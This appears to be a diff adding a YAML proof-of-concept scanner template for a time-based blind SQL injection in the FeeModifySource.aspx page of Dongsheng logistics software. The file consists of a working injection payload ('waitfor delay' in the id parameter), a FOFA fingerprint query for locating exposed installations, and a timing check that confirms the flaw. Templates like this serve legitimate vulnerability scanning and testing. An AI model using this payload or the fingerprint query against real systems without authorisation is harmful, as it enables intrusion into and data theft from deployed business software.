@@ -1,0 +1,17 @@
+id: poc-yaml-dongshengsoft-feemodifysource-aspx-sqli
+info:
+  name: 东胜物流软件 FeeModifySource.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /Shipping/FeeModifySource.aspx?handle=apply&applystate=1&checkstate=1&applytype=1&oplb=1&id=1'waitfor+delay'0:0:{{.t1}}'--+-&val=b9733091-e978-4cb5-a845-765a82ca1217
+  expression: status_code == 200 && contains(body,"<rows></rows>") && contains(content_type,"text/xml")
+    && duration > t1 && duration < t2
+transport: http
